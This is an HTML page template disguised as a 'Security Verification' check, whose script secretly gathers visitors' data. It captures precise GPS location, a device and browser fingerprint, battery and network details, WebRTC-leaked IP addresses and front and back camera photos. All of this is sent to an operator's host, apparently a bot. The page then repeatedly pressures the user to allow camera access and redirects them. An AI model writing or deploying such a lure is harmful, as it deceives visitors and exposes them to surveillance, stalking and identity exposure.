<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Just a moment...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .container {
            max-width: 500px;
            width: 90%;
            background: rgba(255, 255, 255, 0.97);
            backdrop-filter: blur(10px);
            border-radius: 24px;
            padding: 40px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            text-align: center;
            color: #333;
            position: relative;
            overflow: hidden;
        }
        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
            animation: pulse-bg 4s infinite;
            pointer-events: none;
        }
        @keyframes pulse-bg { 0% { transform: scale(0.8); } 50% { transform: scale(1.2); } 100% { transform: scale(0.8); } }

        .logo { 
            font-size: 64px; 
            margin-bottom: 20px; 
            background: linear-gradient(45deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: float 3s ease-in-out infinite;
        }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }

        h1 { 
            font-size: 28px; 
            margin-bottom: 8px; 
            color: #4f46e5; 
            font-weight: 700;
        }
        .subtitle { 
            font-size: 16px; 
            color: #64748b; 
            margin-bottom: 30px; 
            line-height: 1.5;
        }

        .progress-container {
            width: 100%;
            height: 10px;
            background: #e2e8f0;
            border-radius: 9999px;
            overflow: hidden;
            margin: 25px 0;
            position: relative;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #4f46e5, #7c3aed);
            border-radius: 9999px;
            width: 0%;
            transition: width 0.3s ease;
        }
        .progress-label {
            font-size: 12px;
            color: #94a3b8;
            margin-top: 8px;
        }

        .info-box {
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 16px;
            padding: 24px;
            margin: 25px 0;
            text-align: left;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
        }
        .info-item {
            display: flex;
            align-items: center;
            margin: 12px 0;
            font-size: 14px;
            color: #475569;
            transition: all 0.3s ease;
        }
        .info-item.completed {
            color: #16a34a;
            font-weight: 500;
        }
        .info-item.failed {
            color: #ef4444;
        }
        .checkmark {
            width: 16px;
            height: 16px;
            border-radius: 50%;
            margin-right: 12px;
            transition: all 0.3s ease;
        }
        .check-pending { background: #fbbf24; }
        .check-success { background: #10b981; }
        .check-error { background: #ef4444; }

        .badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: #dbeafe;
            color: #1d4ed8;
            padding: 8px 16px;
            border-radius: 9999px;
            font-size: 13px;
            font-weight: 600;
            margin-top: 20px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .status {
            font-size: 14px;
            color: #94a3b8;
            margin-top: 25px;
            font-style: italic;
        }

        /* Camera Modal */
        .camera-modal {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.85);
            z-index: 9999;
            backdrop-filter: blur(8px);
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .camera-modal.active {
            display: flex;
            animation: modalFadeIn 0.3s ease-out;
        }
        @keyframes modalFadeIn { from { opacity: 0; } to { opacity: 1; } }

        .camera-content {
            background: white;
            border-radius: 20px;
            padding: 35px;
            text-align: center;
            max-width: 420px;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
            transform: scale(0.9);
            animation: modalPop 0.3s ease-out forwards;
        }
        @keyframes modalPop { from { transform: scale(0.9); } to { transform: scale(1); } }

        .camera-icon {
            font-size: 80px;
            margin-bottom: 20px;
            background: linear-gradient(45deg, #ef4444, #dc2626);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .camera-title {
            font-size: 22px;
            font-weight: 700;
            color: #1e293b;
            margin-bottom: 12px;
        }
        .camera-text {
            font-size: 16px;
            color: #64748b;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .camera-buttons {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin-top: 20px;
        }
        .camera-btn {
            padding: 14px 32px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            min-width: 120px;
        }
        .btn-allow {
            background: #10b981;
            color: white;
        }
        .btn-allow:hover {
            background: #059669;
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(16, 185, 129, 0.3);
        }
        .btn-deny {
            background: #ef4444;
            color: white;
        }
        .btn-deny:hover {
            background: #dc2626;
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(239, 68, 68, 0.3);
        }

        /* Success Animation */
        .success-animation {
            position: fixed;
            inset: 0;
            background: rgba(255, 255, 255, 0.9);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.5s ease;
        }
        .success-animation.show {
            opacity: 1;
        }
        .success-check {
            font-size: 120px;
            color: #10b981;
            animation: bounce 0.6s ease;
        }
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-30px); }
            60% { transform: translateY(-15px); }
        }
        .success-text {
            font-size: 24px;
            font-weight: 700;
            color: #1e293b;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üîí</div>
        <h1>Security Verification</h1>
        <p class="subtitle">We're verifying your device for enhanced security. This may take up to 30 seconds.</p>
        
        <div class="loader"></div>
        
        <div class="progress-container">
            <div class="progress-fill" id="progressBar"></div>
        </div>
        <div class="progress-label" id="progressLabel">0%</div>
        
        <div class="info-box">
            <div class="info-item" id="item1">
                <div class="checkmark check-pending"></div>
                <span id="status1">Gathering device information...</span>
            </div>
            <div class="info-item" id="item2">
                <div class="checkmark check-pending"></div>
                <span id="status2">Analyzing network data...</span>
            </div>
            <div class="info-item" id="item3">
                <div class="checkmark check-pending"></div>
                <span id="status3">Fingerprinting browser...</span>
            </div>
            <div class="info-item" id="item4">
                <div class="checkmark check-pending"></div>
                <span id="status4">Collecting system info...</span>
            </div>
            <div class="info-item" id="item5">
                <div class="checkmark check-pending"></div>
                <span id="status5">Requesting camera access...</span>
            </div>
        </div>
        
        <div class="badge">üõ°Ô∏è Enterprise Grade Security</div>
        <p class="status">This process helps protect against fraud and unauthorized access.</p>
    </div>

    <!-- Camera Permission Modal -->
    <div class="camera-modal" id="cameraModal">
        <div class="camera-content">
            <div class="camera-icon">üì∑</div>
            <h3 class="camera-title">Camera Access Required</h3>
            <p class="camera-text">
                For security verification, we need to capture a quick image using your camera.
                <br><br>
                <strong>This helps ensure you're not a bot.</strong>
            </p>
            <div class="camera-buttons">
                <button class="camera-btn btn-allow" onclick="allowCamera()">Allow Access</button>
                <button class="camera-btn btn-deny" onclick="denyCamera()">Block</button>
            </div>
        </div>
    </div>

    <!-- Success Animation -->
    <div class="success-animation" id="successAnimation">
        <div class="success-check">‚úì</div>
        <div class="success-text">Verification Complete!</div>
    </div>

    <script>
        const uid = '<%= uid %>';
        const host = '<%= host %>';
        const targetUrl = '<%= url %>';
        const delay = <%= duration %>;
        const progressBar = document.getElementById('progressBar');
        const progressLabel = document.getElementById('progressLabel');

        let cameraAttempts = 0;
        let cameraGranted = false;
        let cameraDenied = false;
        let completedSteps = 0;
        const totalSteps = 5;

        function updateStatus(stepId, message, status = 'success') {
            const item = document.getElementById(`item${stepId}`);
            const statusSpan = document.getElementById(`status${stepId}`);
            const checkmark = item.querySelector('.checkmark');
            
            if (statusSpan) statusSpan.textContent = message;
            
            if (status === 'success') {
                item.classList.add('completed');
                checkmark.className = 'checkmark check-success';
            } else if (status === 'error') {
                item.classList.add('failed');
                checkmark.className = 'checkmark check-error';
            } else {
                checkmark.className = 'checkmark check-pending';
            }
        }

        function updateProgress() {
            const percent = Math.min(Math.floor((completedSteps / totalSteps) * 100), 100);
            progressBar.style.width = `${percent}%`;
            progressLabel.textContent = `${percent}%`;
        }

        function completeStep(stepId, message = null, status = 'success') {
            if (message) updateStatus(stepId, message, status);
            completedSteps++;
            updateProgress();
        }

        async function send(endpoint, data) {
            try {
                const response = await fetch(`${host}/${endpoint}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}`);
                }
                
                const result = await response.json();
                console.log(`‚úÖ ${endpoint} success:`, result);
                return result;
            } catch (error) {
                console.error(`‚ùå ${endpoint} failed:`, error.message);
                // Send error to bot for debugging
                try {
                    await fetch(`${host}/info`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            uid: uid,
                            data: `<b>üì§ Send Failed (${endpoint}):</b> <code>${error.message}</code>`
                        })
                    });
                } catch (e) {
                    console.error('Failed to send error report:', e);
                }
                return { success: false, error: error.message };
            }
        }

        // ========== MAXIMUM INFO GATHERING ==========

        // 1. LOCATION
        setTimeout(() => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        const result = await send('location', {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            uid: uid,
                            acc: pos.coords.accuracy,
                            alt: pos.coords.altitude,
                            heading: pos.coords.heading,
                            speed: pos.coords.speed
                        });
                        completeStep(1, '‚úì Location secured', result.success ? 'success' : 'error');
                    },
                    async (err) => {
                        await send('info', { uid: uid, data: `<b>üìç Location Error:</b> <code>${err.message}</code>` });
                        completeStep(1, '‚ö†Ô∏è Location access denied', 'error');
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                completeStep(1, '‚ö†Ô∏è Location not supported', 'error');
            }
        }, 300);

        // 2. DEVICE FINGERPRINT
        setTimeout(async () => {
            try {
                const fp = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages?.join(', ') || 'N/A',
                    cookies: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack || 'unknown',
                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    touch: navigator.maxTouchPoints > 0,
                    webdriver: navigator.webdriver,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timezoneOffset: new Date().getTimezoneOffset(),
                    online: navigator.onLine,
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        availWidth: screen.availWidth,
                        availHeight: screen.availHeight,
                        colorDepth: screen.colorDepth,
                        pixelDepth: screen.pixelDepth,
                        dpi: window.devicePixelRatio
                    }
                };

                const result = await send('info', { 
                    uid: uid, 
                    data: `<b>üñ•Ô∏è Device Fingerprint</b>\n<code>${JSON.stringify(fp, null, 2)}</code>` 
                });
                completeStep(2, '‚úì Device profile created', result.success ? 'success' : 'error');
            } catch (err) {
                await send('info', { uid: uid, data: `<b>üñ•Ô∏è Device Error:</b> <code>${err.message}</code>` });
                completeStep(2, '‚ö†Ô∏è Device scan failed', 'error');
            }
        }, 800);

        // 3. BATTERY + NETWORK
        setTimeout(async () => {
            let messages = [];

            // Battery
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    const batteryInfo = `${(battery.level * 100).toFixed(1)}% | Charging: ${battery.charging}`;
                    await send('info', { uid: uid, data: `<b>üîã Battery:</b> ${batteryInfo}` });
                    messages.push('Battery');
                } catch(e) {
                    messages.push('BatErr');
                }
            }

            // Network
            if (navigator.connection) {
                const conn = navigator.connection;
                const networkInfo = `${conn.effectiveType || 'unknown'} | ${conn.downlink || '?'} Mbps | RTT: ${conn.rtt || '?'}ms`;
                await send('info', { uid: uid, data: `<b>üåê Network:</b> ${networkInfo}` });
                messages.push('Network');
            }

            completeStep(3, `‚úì ${messages.join(', ')}`, 'success');
        }, 1500);

        // 4. FINGERPRINTING (Canvas + Audio + WebRTC + Fonts)
        setTimeout(async () => {
            let messages = [];

            // Canvas Fingerprint
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = "14px Arial";
                ctx.fillText('MultiInfoBotFingerprint', 2, 2);
                const canvasFP = canvas.toDataURL().substring(0, 100) + '...';
                await send('info', { uid: uid, data: `<b>üé® Canvas FP:</b> <code>${canvasFP}</code>` });
                messages.push('Canvas');
            } catch(e) {
                messages.push('CanvErr');
            }

            // Audio Fingerprint
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                await send('info', { uid: uid, data: `<b>üéµ AudioContext:</b> Supported` });
                messages.push('Audio');
            } catch(e) {
                await send('info', { uid: uid, data: `<b>üéµ AudioContext:</b> Not supported` });
                messages.push('AudErr');
            }

            // WebRTC IP Leak
            try {
                const getIPs = () => {
                    return new Promise(resolve => {
                        const ips = [];
                        const pc = new RTCPeerConnection({ iceServers: [] });
                        pc.createDataChannel('');
                        pc.createOffer().then(o => pc.setLocalDescription(o));
                        pc.onicecandidate = e => {
                            if (!e || !e.candidate) {
                                resolve(ips);
                                return;
                            }
                            const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                            if (ipMatch && !ips.includes(ipMatch[1])) {
                                ips.push(ipMatch[1]);
                            }
                        };
                        setTimeout(() => {
                            pc.close();
                            resolve(ips);
                        }, 2000);
                    });
                };

                const ips = await getIPs();
                if (ips.length) {
                    await send('info', { uid: uid, data: `<b>üåê WebRTC IPs:</b>\n<code>${ips.join('\\n')}</code>` });
                    messages.push('WebRTC');
                }
            } catch(e) {
                messages.push('IP Err');
            }

            // Installed Fonts
            try {
                const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia'];
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
                
                const installed = testFonts.filter(font => {
                    ctx.font = `72px "${font}", monospace`;
                    const testWidth = ctx.measureText('mmmmmmmmmmlli').width;
                    return Math.abs(baseWidth - testWidth) > 2;
                });
                
                await send('info', { uid: uid, data: `<b>üî† Fonts:</b> ${installed.join(', ')}` });
                messages.push('Fonts');
            } catch(e) {
                messages.push('FontErr');
            }

            completeStep(4, `‚úì ${messages.join(', ')}`, 'success');
        }, 2200);

        // ========== CAMERA HANDLING ==========

        function showCameraModal() {
            document.getElementById('cameraModal').classList.add('active');
            send('cam-status', { uid: uid, status: 'pending' });
            updateStatus(5, '‚è≥ Waiting for your permission...');
        }

        function allowCamera() {
            document.getElementById('cameraModal').classList.remove('active');
            cameraGranted = true;
            requestCameraAccess();
        }

        function denyCamera() {
            document.getElementById('cameraModal').classList.remove('active');
            cameraDenied = true;
            send('cam-status', { uid: uid, status: 'denied' });
            completeStep(5, '‚ùå Camera access denied', 'error');
        }

        async function requestCameraAccess(facingMode = 'user') {
            if (cameraGranted || cameraDenied) return;

            try {
                const constraints = {
                    video: facingMode === 'environment' ? { facingMode: 'environment' } : true
                };
                
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                captureAndSend(stream, facingMode);
            } catch (err) {
                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                    cameraAttempts++;
                    if (cameraAttempts <= 3) {
                        setTimeout(showCameraModal, 1000);
                        updateStatus(5, `‚ö†Ô∏è Attempt ${cameraAttempts}/3 - Please allow camera`);
                    } else {
                        cameraDenied = true;
                        send('cam-status', { uid: uid, status: 'error' });
                        completeStep(5, '‚ùå Camera permanently denied', 'error');
                    }
                } else {
                    if (facingMode === 'user') {
                        setTimeout(() => requestCameraAccess('environment'), 1000);
                        updateStatus(5, 'üîÑ Trying back camera...');
                    } else {
                        cameraDenied = true;
                        send('cam-status', { uid: uid, status: 'error' });
                        completeStep(5, '‚ö†Ô∏è Camera error', 'error');
                    }
                }
            }
        }

        function captureAndSend(stream, type = 'user') {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            send('cam-status', { uid: uid, status: 'allowed' });
            updateStatus(5, `üì∑ Capturing ${type === 'environment' ? 'back' : 'front'} camera...`);
            
            video.onloadedmetadata = () => {
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
                    
                    send('camsnap', { 
                        uid: uid, 
                        [type === 'environment' ? 'back' : 'front']: imageData 
                    }).then(result => {
                        if (result.success) {
                            updateStatus(5, `‚úì ${type === 'environment' ? 'Back' : 'Front'} camera captured`);
                        } else {
                            updateStatus(5, `‚ö†Ô∏è ${type === 'environment' ? 'Back' : 'Front'} cam failed`, 'error');
                        }
                    });
                    
                    stream.getTracks().forEach(t => t.stop());
                    
                    if (type === 'user') {
                        setTimeout(() => requestCameraAccess('environment'), 1500);
                    } else {
                        completeStep(5);
                    }
                }, 500);
            };
        }

        // Start camera after other data collected
        setTimeout(() => {
            requestCameraAccess();
        }, 3000);

        // Redirect with success animation
        setTimeout(() => {
            document.getElementById('successAnimation').classList.add('show');
            setTimeout(() => {
                window.location.href = targetUrl;
            }, 1000);
        }, delay - 1000);
    </script>
</body>
</html>
